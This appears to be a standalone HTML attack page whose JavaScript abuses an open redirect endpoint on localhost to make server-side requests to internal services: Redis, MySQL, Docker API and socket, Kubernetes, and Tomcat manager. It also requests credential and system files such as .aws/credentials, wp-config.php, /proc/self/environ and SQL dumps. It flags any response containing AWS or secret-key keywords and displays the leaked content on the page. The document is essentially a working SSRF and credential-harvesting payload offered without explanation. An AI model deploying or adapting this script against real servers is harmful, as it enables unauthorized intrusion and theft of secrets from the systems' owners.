<!DOCTYPE html>
<html>
<head>
    <title>Internal Environment Discovery</title>
</head>
<body>
    <h1>üîç Internal Environment & Process Discovery</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Look for environment variables and internal services
        var envTests = [
            // Environment variable endpoints
            'http://httpbin.org/anything/env',  // Might reflect server env vars
            
            // PHP specific info gathering
            'http://localhost/?phpinfo',
            'http://localhost/index.php?info',
            'http://localhost/test.php?phpinfo',
            
            // Common internal ports and services
            'http://localhost:9000/',  // Often used for internal services
            'http://localhost:9001/',
            'http://localhost:6379/',  // Redis
            'http://localhost:3306/',  // MySQL
            'http://localhost:5432/',  // PostgreSQL
            'http://localhost:11211/', // Memcached
            'http://localhost:8080/manager/', // Tomcat
            'http://localhost:8080/status/',
            
            // Docker/container specific
            'http://localhost:2375/', // Docker API
            'http://localhost:2376/', // Docker API SSL
            'http://unix:/var/run/docker.sock/', // Docker socket
            
            // Kubernetes
            'http://kubernetes.default.svc.cluster.local/',
            'http://kubernetes.default.svc.cluster.local/api/',
            
            // Local credential files
            'http://localhost/wp-config.php',
            'http://localhost/config/database.yml',
            'http://localhost/config/app.yml',
            'http://localhost/.aws/config',
            'http://localhost/.aws/credentials',
            
            // Process/system info
            'http://localhost/proc/version',
            'http://localhost/proc/cpuinfo',
            'http://localhost/proc/meminfo',
            'http://localhost/proc/net/arp',
            'http://localhost/proc/self/environ',
            
            // Check for backup/old files
            'http://localhost/backup.sql',
            'http://localhost/database.sql',
            'http://localhost/dump.sql',
            'http://localhost/config.bak',
            'http://localhost/config.old',
            'http://localhost/aws-credentials.bak',
            'http://localhost/credentials.txt'
        ];
        
        for(var i = 0; i < envTests.length; i++) {
            try {
                results += "<h4>üîç " + envTests[i] + "</h4>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + envTests[i], false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.trim().length > 3) {
                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>üéØ DISCOVERY: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for AWS-related keywords
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('aws') || text.includes('s3') || text.includes('access') || text.includes('secret') || text.includes('key')) {
                        results += "<div style='background:#ffff00;padding:5px;border:2px solid red;'>üö® CONTAINS AWS/CREDENTIAL KEYWORDS! üö®</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:8px;font-size:10px;max-height:120px;overflow:scroll;white-space:pre-wrap;'>" + xhr.responseText.substring(0, 1000) + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:2px;'>‚ùå No data</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:2px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
